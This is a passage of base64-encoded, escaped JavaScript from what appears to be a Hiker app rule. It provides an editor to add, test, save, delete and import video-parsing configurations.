XFxcIue8lui+keino+aekDpcXFxcXFxcIiArIG9iai5uYW1lKTtcXFxcbn0gZWxzZSB7XFxcXG4gICAgb2JqID0ge1xcXFxuICAgICAgICBydW5UeXBlOiBcXFxcXFxcIldFQlxcXFxcXFwiLFxcXFxuICAgICAgICBtZXRob2Q6IFxcXFxcXFwiR0VUXFxcXFxcXCJcXFxcbiAgICB9O1xcXFxuICAgIHNldFBhZ2VUaXRsZShcXFxcXFxcIuaWsOW7uuino+aekFxcXFxcXFwiKTtcXFxcbn1cXFxcblxcXFxuZC5wdXNoKHtcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJpbnB1dFxcXFxcXFwiLFxcXFxuICAgIGRlc2M6IFxcXFxcXFwi5ZCN5a2XKOW/heWhqylcXFxcXFxcIixcXFxcbiAgICBleHRyYToge1xcXFxuICAgICAgICBvbkNoYW5nZTogJC50b1N0cmluZygoKSA9PiB7XFxcXG4gICAgICAgICAgICBwdXRNeVZhcihcXFxcXFxcInBzX25hbWVcXFxcXFxcIiwgaW5wdXQpO1xcXFxuICAgICAgICB9KSxcXFxcbiAgICAgICAgZGVmYXVsdFZhbHVlOiBvYmoubmFtZSxcXFxcbiAgICAgICAgdGl0bGVWaXNpYmxlOiBmYWxzZVxcXFxuICAgIH1cXFxcbn0pO1xcXFxuXFxcXG5cXFxcbmQucHVzaCh7XFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwiaW5wdXRcXFxcXFxcIixcXFxcbiAgICBkZXNjOiBcXFxcXFxcIuino+aekHVybCjlv4XloaspXFxcXFxcXCIsXFxcXG4gICAgZXh0cmE6IHtcXFxcbiAgICAgICAgb25DaGFuZ2U6ICQudG9TdHJpbmcoKCkgPT4ge1xcXFxuICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJwc191cmxcXFxcXFxcIiwgaW5wdXQpO1xcXFxuICAgICAgICB9KSxcXFxcbiAgICAgICAgZGVmYXVsdFZhbHVlOiBvYmoudXJsLFxcXFxuICAgICAgICB0aXRsZVZpc2libGU6IGZhbHNlLFxcXFxuICAgIH1cXFxcbn0pO1xcXFxuZC5wdXNoKHtcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJpbnB1dFxcXFxcXFwiLFxcXFxuICAgIGRlc2M6IFxcXFxcXFwiZmxhZyjlv4XloaspXFxcXFxcXCIsXFxcXG4gICAgZXh0cmE6IHtcXFxcbiAgICAgICAgdHlwZTogXFxcXFxcXCJ0ZXh0YXJlYVxcXFxcXFwiLFxcXFxuICAgICAgICBoZWlnaHQ6IDIsXFxcXG4gICAgICAgIGhpZ2hsaWdodDogdHJ1ZSxcXFxcbiAgICAgICAgb25DaGFuZ2U6ICQudG9TdHJpbmcoKCkgPT4ge1xcXFxuICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJwc19mbGFnXFxcXFxcXCIsIGlucHV0KTtcXFxcbiAgICAgICAgfSksXFxcXG4gICAgICAgIGRlZmF1bHRWYWx1ZTogb2JqLmZsYWcsXFxcXG4gICAgICAgIHRpdGxlVmlzaWJsZTogZmFsc2UsXFxcXG4gICAgfVxcXFxufSk7XFxcXG5kLnB1c2goe1xcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcImlucHV0XFxcXFxcXCIsXFxcXG4gICAgZGVzYzogXFxcXFxcXCJoZWFkZXJzKOmAieWhqylcXFxcXFxcIixcXFxcbiAgICBleHRyYToge1xcXFxuICAgICAgICB0eXBlOiBcXFxcXFxcInRleHRhcmVhXFxcXFxcXCIsXFxcXG4gICAgICAgIGhlaWdodDogMixcXFxcbiAgICAgICAgaGlnaGxpZ2h0OiB0cnVlLFxcXFxuICAgICAgICBvbkNoYW5nZTogJC50b1N0cmluZygoKSA9PiB7XFxcXG4gICAgICAgICAgICBwdXRNeVZhcihcXFxcXFxcInBzX2hlYWRlcnNcXFxcXFxcIiwgaW5wdXQpO1xcXFxuICAgICAgICB9KSxcXFxcbiAgICAgICAgZGVmYXVsdFZhbHVlOiBvYmouaGVhZGVycyxcXFxcbiAgICAgICAgdGl0bGVWaXNpYmxlOiBmYWxzZSxcXFxcbiAgICB9XFxcXG59KTtcXFxcblxcXFxucHV0TXlWYXIoXFxcXFxcXCJwc19ydW5UeXBlXFxcXFxcXCIsIG9iai5ydW5UeXBlIHx8IFxcXFxcXFwiXFxcXFxcXCIpO1xcXFxuZC5wdXNoKHtcXFxcbiAgICB0aXRsZTogXFxcXFxcXCLop6PmnpDmqKHlvI/vvJpcXFxcXFxcIiArIChvYmoucnVuVHlwZSB8fCBcXFxcXFxcIldFQlxcXFxcXFwiKSxcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0X2NlbnRlcl8xXFxcXFxcXCIsXFxcXG4gICAgdXJsOiAkKFtcXFxcXFxcIldFQlxcXFxcXFwiLCBcXFxcXFxcIkpTT05cXFxcXFxcIiwgXFxcXFxcXCJKU1xcXFxcXFwiXSkuc2VsZWN0KCgpID0+IHtcXFxcblxcXFxuICAgICAgICBwdXRNeVZhcihcXFxcXFxcInBzX3J1blR5cGVcXFxcXFxcIiwgaW5wdXQpO1xcXFxuICAgICAgICB1cGRhdGVJdGVtKFxcXFxcXFwicHNfcnVuVHlwZVxcXFxcXFwiLCB7XFxcXG4gICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLop6PmnpDmqKHlvI/vvJpcXFxcXFxcIiArIGlucHV0XFxcXG4gICAgICAgIH0pO1xcXFxuICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCI7XFxcXG4gICAgfSksXFxcXG4gICAgZXh0cmE6IHtcXFxcbiAgICAgICAgaWQ6IFxcXFxcXFwicHNfcnVuVHlwZVxcXFxcXFwiLFxcXFxuICAgICAgICBsaW5lVmlzaWJsZTogZmFsc2VcXFxcbiAgICB9XFxcXG59KTtcXFxcblxcXFxuXFxcXG5kLnB1c2goe1xcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcImxpbmVfYmxhbmtcXFxcXFxcIlxcXFxufSk7XFxcXG5kLnB1c2goe1xcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcImlucHV0XFxcXFxcXCIsXFxcXG4gICAgZGVzYzogXFxcXFxcXCJqc29uUGF0aChKU09O6Kej5p6Q5qih5byP5b+F5aGrKVxcXFxcXFwiLFxcXFxuICAgIGV4dHJhOiB7XFxcXG4gICAgICAgIG9uQ2hhbmdlOiAkLnRvU3RyaW5nKCgpID0+IHtcXFxcbiAgICAgICAgICAgIHB1dE15VmFyKFxcXFxcXFwicHNfanNvblBhdGhcXFxcXFxcIiwgaW5wdXQpO1xcXFxuICAgICAgICB9KSxcXFxcbiAgICAgICAgZGVmYXVsdFZhbHVlOiBvYmouanNvblBhdGgsXFxcXG4gICAgICAgIHRpdGxlVmlzaWJsZTogZmFsc2UsXFxcXG4gICAgfVxcXFxufSk7XFxcXG5wdXRNeVZhcihcXFxcXFxcInBzX21ldGhvZFxcXFxcXFwiLCBvYmoubWV0aG9kIHx8IFxcXFxcXFwiXFxcXFxcXCIpO1xcXFxuZC5wdXNoKHtcXFxcbiAgICB0aXRsZTogXFxcXFxcXCJKU09O6K+35rGC5qih5byP77yaXFxcXFxcXCIgKyAob2JqLm1ldGhvZCB8fCBcXFxcXFxcIkdFVFxcXFxcXFwiKSxcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0XzFcXFxcXFxcIixcXFxcbiAgICB1cmw6ICQoW1xcXFxcXFwiR0VUXFxcXFxcXCIsIFxcXFxcXFwiUE9TVFxcXFxcXFwiXSkuc2VsZWN0KCgpID0+IHtcXFxcblxcXFxuICAgICAgICBwdXRNeVZhcihcXFxcXFxcInBzX21ldGhvZFxcXFxcXFwiLCBpbnB1dCk7XFxcXG4gICAgICAgIHVwZGF0ZUl0ZW0oXFxcXFxcXCJwc19tZXRob2RcXFxcXFxcIiwge1xcXFxuICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwiSlNPTuivt+axguaooeW8j++8mlxcXFxcXFwiICsgaW5wdXRcXFxcbiAgICAgICAgfSk7XFxcXG4gICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIjtcXFxcbiAgICB9KSxcXFxcbiAgICBleHRyYToge1xcXFxuICAgICAgICBpZDogXFxcXFxcXCJwc19tZXRob2RcXFxcXFxcIixcXFxcbiAgICAgICAgbGluZVZpc2libGU6IGZhbHNlXFxcXG4gICAgfVxcXFxufSk7XFxcXG5kLnB1c2goe1xcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcImxpbmVfYmxhbmtcXFxcXFxcIlxcXFxufSk7XFxcXG5kLnB1c2goe1xcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcImlucHV0XFxcXFxcXCIsXFxcXG4gICAgZGVzYzogXFxcXFxcXCJqcyhKU+aooeW8j+W/heWhqylcXFxcXFxcIixcXFxcbiAgICBleHRyYToge1xcXFxuICAgICAgICB0eXBlOiBcXFxcXFxcInRleHRhcmVhXFxcXFxcXCIsXFxcXG4gICAgICAgIGhlaWdodDogMyxcXFxcbiAgICAgICAgaGlnaGxpZ2h0OiB0cnVlLFxcXFxuICAgICAgICBvbkNoYW5nZTogJC50b1N0cmluZygoKSA9PiB7XFxcXG4gICAgICAgICAgICBwdXRNeVZhcihcXFxcXFxcInBzX2pzXFxcXFxcXCIsIGlucHV0KTtcXFxcbiAgICAgICAgfSksXFxcXG4gICAgICAgIGRlZmF1bHRWYWx1ZTogb2JqLmpzLFxcXFxuICAgICAgICB0aXRsZVZpc2libGU6IGZhbHNlLFxcXFxuICAgIH1cXFxcbn0pO1xcXFxuZC5wdXNoKHtcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJsaW5lX2JsYW5rXFxcXFxcXCJcXFxcbn0pO1xcXFxuZC5wdXNoKHtcXFxcbiAgICB0aXRsZTogXFxcXFxcXCLliKDpmaRcXFxcXFxcIixcXFxcbiAgICB1cmw6ICQoXFxcXFxcXCIjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZSgoaW5kZXgsIHVybEluZGV4KSA9PiB7XFxcXG4gICAgICAgIGlmIChpbmRleCA9PT0gdm9pZCgwKSkge1xcXFxuICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/mraTpobnml6Dms5XliKDpmaRcXFxcXFxcIjtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBpZiAodXJsSW5kZXggIT09IHZvaWQoMCkpIHtcXFxcbiAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5q2j5Zyo5pu05paw6Kej5p6Q77yM5Yig6Zmk6K+35LuO6Kej5p6Q566h55CG6L+b5YWlXFxcXFxcXCI7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgY29uZmlybSh7XFxcXG4gICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLmuKnppqjmj5DnpLpcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIGNvbnRlbnQ6IFxcXFxcXFwi56Gu5a6a6KaB5Yig6Zmk5q2k6Kej5p6Q5ZCX77yf5rOo5oSP5Yig6Zmk5ZCO5peg5rOV5oGi5aSNXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICBjb25maXJtOiAkLnRvU3RyaW5nKChpbmRleCkgPT4ge1xcXFxuICAgICAgICAgICAgICAgIGxldCBhcnIgPSAkLnJlcXVpcmUoXFxcXFxcXCJjb25maWdzXFxcXFxcXCIpLmdldEpzb24oKTtcXFxcbiAgICAgICAgICAgICAgICBhcnIuc3BsaWNlKGluZGV4LCAxKTtcXFxcbiAgICAgICAgICAgICAgICAkLnJlcXVpcmUoXFxcXFxcXCJjb25maWdzXFxcXFxcXCIpLnNhdmVKc29uKGFycik7XFxcXG4gICAgICAgICAgICAgICAgYmFjayh0cnVlKTtcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+WIoOmZpOaIkOWKn1xcXFxcXFwiO1xcXFxuICAgICAgICAgICAgfSwgaW5kZXgpXFxcXG4gICAgICAgIH0pO1xcXFxuICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCJcXFxcbiAgICB9LCBpbmRleCwgdXJsSW5kZXgpLFxcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfM1xcXFxcXFwiLFxcXFxufSk7XFxcXG5cXFxcbmQucHVzaCh7XFxcXG4gICAgdGl0bGU6IFxcXFxcXFwi5rWL6K+VXFxcXFxcXCIsXFxcXG4gICAgdXJsOiAkKFxcXFxcXFwiI25vTG9hZGluZyNcXFxcXFxcIikubGF6eVJ1bGUoKCkgPT4ge1xcXFxuICAgICAgICBsZXQgdGVzdEtleXdvcmQgPSBnZXRJdGVtKFxcXFxcXFwidGVzdFVybFxcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbiAgICAgICAgcmV0dXJuICQodGVzdEtleXdvcmQsIFxcXFxcXFwi6K+36L6T5YWl5b2x6KeG572R56uZ5Zyw5Z2AXFxcXFxcXCIpLmlucHV0KCgpID0+IHtcXFxcbiAgICAgICAgICAgIHNldEl0ZW0oXFxcXFxcXCJ0ZXN0VXJsXFxcXFxcXCIsIGlucHV0KTtcXFxcbiAgICAgICAgICAgIGxldCB1cmwgPSBnZXRNeVZhcihcXFxcXFxcInBzX3VybFxcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIGxldCBuYW1lID0gZ2V0TXlWYXIoXFxcXFxcXCJwc19uYW1lXFxcXFxcXCIsIFxcXFxcXFwiXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgbGV0IGZsYWcgPSBnZXRNeVZhcihcXFxcXFxcInBzX2ZsYWdcXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICBsZXQgaGVhZGVycyA9IGdldE15VmFyKFxcXFxcXFwicHNfaGVhZGVyc1xcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIGxldCBydW5UeXBlID0gZ2V0TXlWYXIoXFxcXFxcXCJwc19ydW5UeXBlXFxcXFxcXCIsIFxcXFxcXFwiV0VCXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgbGV0IG1ldGhvZCA9IGdldE15VmFyKFxcXFxcXFwicHNfbWV0aG9kXFxcXFxcXCIsIFxcXFxcXFwiR0VUXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgbGV0IGpzb25QYXRoID0gZ2V0TXlWYXIoXFxcXFxcXCJwc19qc29uUGF0aFxcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiKS50cmltKCkgfHwgdm9pZCAwO1xcXFxuICAgICAgICAgICAgbGV0IGpzID0gZ2V0TXlWYXIoXFxcXFxcXCJwc19qc1xcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiKSB8fCB2b2lkIDA7XFxcXG4gICAgICAgICAgICBpZiAoaGVhZGVycykge1xcXFxuICAgICAgICAgICAgICAgIHRyeSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGhlYWRlcnMgPSBKU09OLnBhcnNlKGhlYWRlcnMpO1xcXFxuICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGVhZGVyc+agvOW8j+mUmeivrzpcXFxcXFxcIiArIGUudG9TdHJpbmcoKTtcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICByZXR1cm4gJC5yZXF1aXJlKFxcXFxcXFwidmlkZW9VcmxcXFxcXFxcIikucHJlcGFyZVBhcnNlcyhbe1xcXFxuICAgICAgICAgICAgICAgIG5hbWUsXFxcXG4gICAgICAgICAgICAgICAgdXJsLFxcXFxuICAgICAgICAgICAgICAgIGZsYWcsXFxcXG4gICAgICAgICAgICAgICAgaGVhZGVycyxcXFxcbiAgICAgICAgICAgICAgICBydW5UeXBlLFxcXFxuICAgICAgICAgICAgICAgIG1ldGhvZCxcXFxcbiAgICAgICAgICAgICAgICBqc29uUGF0aCxcXFxcbiAgICAgICAgICAgICAgICBqc1xcXFxuICAgICAgICAgICAgfV0sIGlucHV0LG51bGwsIHRydWUpO1xcXFxuICAgICAgICB9KTtcXFxcbiAgICB9KSxcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0XzNcXFxcXFxcIixcXFxcbn0pO1xcXFxuXFxcXG5kLnB1c2goe1xcXFxuICAgIHRpdGxlOiBcXFxcXFxcIuS/neWtmFxcXFxcXFwiLFxcXFxuICAgIHVybDogJChcXFxcXFxcIiNub0xvYWRpbmcjXFxcXFxcXCIpLmxhenlSdWxlKChpbmRleCwgaXNJbXBvcnQpID0+IHtcXFxcbiAgICAgICAgbGV0IG5hbWUgPSBnZXRNeVZhcihcXFxcXFxcInBzX25hbWVcXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIikudHJpbSgpO1xcXFxuICAgICAgICBpZiAoIW5hbWUpIHtcXFxcbiAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5ZCN5a2X5b6X5pyJ5LiA5Liq5ZCnXFxcXFxcXCI7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgbGV0IHVybCA9IGdldE15VmFyKFxcXFxcXFwicHNfdXJsXFxcXFxcXCIsIFxcXFxcXFwiXFxcXFxcXCIpLnRyaW0oKTtcXFxcbiAgICAgICAgaWYgKCF1cmwpIHtcXFxcbiAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v6Kej5p6Q5Zyw5Z2A5LiN6IO95Li656m6XFxcXFxcXCI7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgbGV0IGZsYWcgPSBnZXRNeVZhcihcXFxcXFxcInBzX2ZsYWdcXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIik7XFxcXG4gICAgICAgIGlmICghZmxhZykge1xcXFxuICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/op6PmnpDlnLDlnYDmoIfor4bkuI3og73kuLrnqbpcXFxcXFxcIjtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBsZXQgaGVhZGVycyA9IGdldE15VmFyKFxcXFxcXFwicHNfaGVhZGVyc1xcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiKS50cmltKCk7XFxcXG4gICAgICAgIGlmIChoZWFkZXJzKSB7XFxcXG4gICAgICAgICAgICB0cnkge1xcXFxuICAgICAgICAgICAgICAgIGhlYWRlcnMgPSBKU09OLnBhcnNlKGhlYWRlcnMpO1xcXFxuICAgICAgICAgICAgICAgIGlmKHR5cGVvZiBoZWFkZXJzIT09XFxcXFxcXCJvYmplY3RcXFxcXFxcIikgdGhyb3cgbmV3IEVycm9yKFxcXFxcXFwi6ZSZ6K+v57G75Z6L77yM5b+F6aG75Li6T2JqZWN0XFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgfSBjYXRjaCAoZSkge1xcXFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhlYWRlcnPmoLzlvI/plJnor686XFxcXFxcXCIgKyBlLnRvU3RyaW5nKCk7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgbGV0IHJ1blR5cGUgPSBnZXRNeVZhcihcXFxcXFxcInBzX3J1blR5cGVcXFxcXFxcIiwgXFxcXFxcXCJXRUJcXFxcXFxcIik7XFxcXG4gICAgICAgIGxldCBtZXRob2QgPSBnZXRNeVZhcihcXFxcXFxcInBzX21ldGhvZFxcXFxcXFwiLCBcXFxcXFxcIkdFVFxcXFxcXFwiKTtcXFxcbiAgICAgICAgbGV0IGpzb25QYXRoID0gZ2V0TXlWYXIoXFxcXFxcXCJwc19qc29uUGF0aFxcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiKS50cmltKCkgfHwgdm9pZCAwO1xcXFxuICAgICAgICBsZXQganMgPSBnZXRNeVZhcihcXFxcXFxcInBzX2pzXFxcXFxcXCIsIFxcXFxcXFwiXFxcXFxcXCIpIHx8IHZvaWQgMDtcXFxcbiAgICAgICAgaWYgKHJ1blR5cGUgPT09IFxcXFxcXFwiSlNPTlxcXFxcXFwiICYmICFqc29uUGF0aCkge1xcXFxuICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly9KU09O5qih5byP5LiL5b+F6aG75aGranNvblBhdGhcXFxcXFxcIjtcXFxcbiAgICAgICAgfSBlbHNlIGlmIChydW5UeXBlID09PSBcXFxcXFxcIkpTXFxcXFxcXCIgJiYgIWpzKSB7XFxcXG4gICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL0pT5qih5byP5LiL5b+F6aG75aGranNcXFxcXFxcIjtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBsZXQgYXJyID0gJC5yZXF1aXJlKFxcXFxcXFwiY29uZmlnc1xcXFxcXFwiKS5nZXRKc29uKCk7XFxcXG4gICAgICAgIGxldCBvYmoxID0ge1xcXFxuICAgICAgICAgICAgbmFtZSxcXFxcbiAgICAgICAgICAgIHVybCxcXFxcbiAgICAgICAgICAgIGZsYWcsXFxcXG4gICAgICAgICAgICBoZWFkZXJzLFxcXFxuICAgICAgICAgICAgcnVuVHlwZSxcXFxcbiAgICAgICAgICAgIG1ldGhvZCxcXFxcbiAgICAgICAgICAgIGpzb25QYXRoLFxcXFxuICAgICAgICAgICAganNcXFxcbiAgICAgICAgfTtcXFxcbiAgICAgICAgaWYgKGluZGV4ID09PSB2b2lkKDApKSB7XFxcXG4gICAgICAgICAgICBpZiAoYXJyLnNvbWUodiA9PiB2Lm5hbWUgPT09IG5hbWUpKSB7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/lt7Lnu4/lrZjlnKjor6Xop6PmnpBcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIGlmIChvYmoxLmdyb3VwKSB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IGdyb3VwID0gb2JqMS5ncm91cDtcXFxcbiAgICAgICAgICAgICAgICBsZXQgaW5kZXggPSBhcnIuZmluZEluZGV4KHYgPT4gdi5ncm91cCA9PT0gZ3JvdXApO1xcXFxuICAgICAgICAgICAgICAgIGlmIChpbmRleCA9PT0gLTEpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgYXJyLnVuc2hpZnQob2JqMSk7XFxcXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgYXJyLnNwbGljZShpbmRleCwgMCwgb2JqMSk7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgICBpZiAoaXNJbXBvcnQpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgYXJyLnB1c2gob2JqMSk7XFxcXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgYXJyLnVuc2hpZnQob2JqMSk7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgbGV0IG5hbWV5ID0gYXJyW2luZGV4XS5uYW1lO1xcXFxuICAgICAgICAgICAgaWYgKG5hbWUgIT09IG5hbWV5KSB7XFxcXG4gICAgICAgICAgICAgICAgaWYgKGFyci5zb21lKHYgPT4gdi5uYW1lID09PSBuYW1lKSkge1xcXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+W3sue7j+WtmOWcqOivpeino+aekFxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIG9iajEgPSBPYmplY3QuYXNzaWduKGFycltpbmRleF0sIG9iajEpO1xcXFxuICAgICAgICAgICAgYXJyLnNwbGljZShpbmRleCwgMSwgb2JqMSk7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgJC5yZXF1aXJlKFxcXFxcXFwiY29uZmlnc1xcXFxcXFwiKS5zYXZlSnNvbihhcnIpO1xcXFxuICAgICAgICBiYWNrKHRydWUpO1xcXFxuICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+S/neWtmOaIkOWKn1xcXFxcXFwiO1xcXFxuICAgIH0sIGluZGV4LCBpc0ltcG9ydCksXFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF8zXFxcXFxcXCIsXFxcXG59KTtcXFxcblxcXFxuc2V0UmVzdWx0KGQpO1xcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIuino+aekOWvvOWFpVxcXCIsXFxcInBhdGhcXFwiOlxcXCJpbXBvcnRcXFwiLFxcXCJydWxlXFxcIjpcXFwianM6XFxcXG5mdW5jdGlvbiBzYXZlQ2FjaGUoanNvbikge1xcXFxuICAgIHdyaXRlRmlsZShcXFxcXFxcImhpa2VyOi8vZmlsZXMvX2NhY2hlL2ppZXhpU2ltcGxlSW1wb3J0Lmpzb25cXFxcXFxcIiwgSlNPTi5zdHJpbmdpZnkoanNvbikpO1xcXFxufVxcXFxuJC5leHBvcnRzID0gZnVuY3Rpb24ocGFzcykge1xcXFxuICAgIHRyeSB7XFxcXG4gICAgICAgIGxldCBbXywgcnVsZSwgdHlwZV0gPSBwYXNzLnNwbGl0KFxcXFxcXFwiJFxcXFxcXFwiKTtcXFxcbiAgICAgICAgaWYgKHR5cGUgPT09IFxcXFxcXFwiYlxcXFxcXFwiKSB7XFxcXG4gICAgICAgICAgICBydWxlID0gcGFyc2VQYXN0ZShydWxlKTtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICBsZXQgcnVsZXMgPSBKU09OLnBhcnNlKGJhc2U2NERlY29kZShydWxlKSk7XFxcXG4gICAgICAgIGlmICghQXJyYXkuaXNBcnJheShydWxlcykpIHtcXFxcbiAgICAgICAgICAgIHJ1bGVzID0gW3J1bGVzXTtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICAvL3J1bGVzLnJldmVyc2UoKTtcXFxcbiAgICAgICAgTVlfVVJMID0gbW9kdWxlLmlkO1xcXFxuICAgICAgICBsZXQgcnVsZVRpdGxlID0gZ2V0UGFyYW0oXFxcXFxcXCJydWxlXFxcXFxcXCIpO1xcXFxuICAgICAgICBsZXQgYXJyID0gJC5yZXF1aXJlKFxcXFxcXFwiY29uZmlncz9ydWxlPVxcXFxcXFwiICsgcnVsZVRpdGxlKS5nZXRKc29uKCk7XFxcXG4gICAgICAgIGxldCBuZXdJID0gMDtcXFxcbiAgICAgICAgZm9yIChsZXQgcnVsZSBvZiBydWxlcykge1xcXFxuICAgICAgICAgICAgbGV0IGluZGV4ID0gYXJyLmZpbmRJbmRleCh2ID0+IHYubmFtZSA9PT0gcnVsZS5uYW1lKTtcXFxcbiAgICAgICAgICAgIGlmIChpbmRleCA+IC0xKSB7XFxcXG4gICAgICAgICAgICAgICAgcnVsZSA9IE9iamVjdC5hc3NpZ24oYXJyW2luZGV4XSwgcnVsZSk7XFxcXG4gICAgICAgICAgICAgICAgYXJyLnNwbGljZShpbmRleCwgMSwgcnVsZSk7XFxcXG4gICAgICAgICAgICAgICAgaWYgKHJ1bGVzLmxlbmd0aCA9PT0gMSkge1xcXFxuICAgICAgICAgICAgICAgICAgICBzYXZlQ2FjaGUocnVsZSk7XFxcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vcGFnZS9ydWxlRWRpdCNub0hpc3RvcnkjI25vUmVjb3JkSGlzdG9yeSM/aXNJbXBvcnQ9dHJ1ZSZpbmRleD1cXFxcXFxcIiArIGluZGV4ICsgXFxcXFxcXCImcnVsZT1cXFxcXFxcIiArIHJ1bGVUaXRsZTtcXFxcbiAgICAgICAgICAgICAgICAgICAgLy90b2FzdChcXFxcXFxcIuW3suabtOaWsOinhOWIme+8mlxcXFxcXFwiICsgcnVsZS5uYW1lKTtcXFxcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgICAgICBsb2coXFxcXFxcXCLlt7Lmm7TmlrDop4TliJnvvJpcXFxcXFxcIiArIHJ1bGUubmFtZSlcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgIG5ld0krKztcXFxcbiAgICAgICAgICAgICAgICBhcnIucHVzaChydWxlKTtcXFxcbiAgICAgICAgICAgICAgICBpZiAocnVsZXMubGVuZ3RoID09PSAxKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHNhdmVDYWNoZShydWxlKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9wYWdlL3J1bGVFZGl0I25vSGlzdG9yeSMjbm9SZWNvcmRIaXN0b3J5Iz9pc0ltcG9ydD10cnVlJnJ1bGU9XFxcXFxcXCIgKyBydWxlVGl0bGU7XFxcXG4gICAgICAgICAgICAgICAgICAgIC8vdG9hc3QoXFxcXFxcXCLlt7Llr7zlhaXop4TliJnvv